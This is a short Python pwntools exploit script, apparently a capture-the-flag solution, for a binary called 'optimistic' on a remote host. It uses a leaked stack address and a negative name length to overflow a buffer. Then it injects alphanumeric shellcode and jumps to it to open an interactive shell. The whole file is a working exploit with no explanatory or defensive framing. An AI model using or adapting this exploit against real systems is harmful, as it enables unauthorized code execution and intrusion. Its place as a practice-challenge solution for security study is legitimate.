from pwn import *

context.log_level = 'critical'
context.binary = binary = ELF('./optimistic')
rop = ROP(binary)

address = '94.237.58.55'
port = 32892


nameLength = b'-1'
shellcode = b'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'
overflow = b'A' * (104 - len(shellcode))

with remote(address, port) as target:
	target.recvuntil(b'Would you like to enroll yourself? (y/n): ')
	target.sendline(b'y')
	target.recvuntil(b'Great! Here\'s a small welcome gift: ')

	shellcodeAddr = int(target.recvline().strip().decode(), 16)
	shellcodeAddr = p64(shellcodeAddr - 96)

	payload = shellcode
	payload += overflow
	payload += shellcodeAddr

	target.sendlineafter(b'Email: ', b'pwned')
	target.sendlineafter(b'Age: ', b'1')
	target.sendlineafter(b'Length of name: ', b'-1')
	target.recvuntil(b'Name: ')
	target.sendline(payload)
	target.interactive()
